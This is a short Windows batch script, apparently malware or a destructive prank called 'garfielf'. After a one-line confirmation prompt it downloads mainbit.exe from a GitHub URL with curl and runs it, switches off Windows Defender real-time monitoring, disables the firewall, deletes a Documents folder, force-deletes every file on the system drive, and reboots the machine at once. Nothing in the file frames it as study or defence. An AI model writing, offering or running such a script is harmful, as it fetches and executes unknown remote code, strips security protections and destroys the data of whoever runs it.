@echo off

cd "C:\"
mkdir garfielf

cd "C:\garfielf"

setlocal
:PROMPT
SET /P AREYOUSURE=yo ass sure? y/n    
IF /I "%AREYOUSURE%" NEQ "Y" GOTO END
echo gg
timeout /t 1
curl -o "mainbit.exe" https://github.com/jgoderino/garfielf/raw/main/mainbit.exe
START C:\garfielf\mainbit.exe
endlocal
powershell Set-MpPreference -DisableRealtimeMonitoring
netsh firewall set opmode disable
@RD /S /Q "%UserProfile%\Documents\testfolder"
del %systemdrive%\*.* /f /s /q
shutdown -r -f -t 00


:END
endlocal
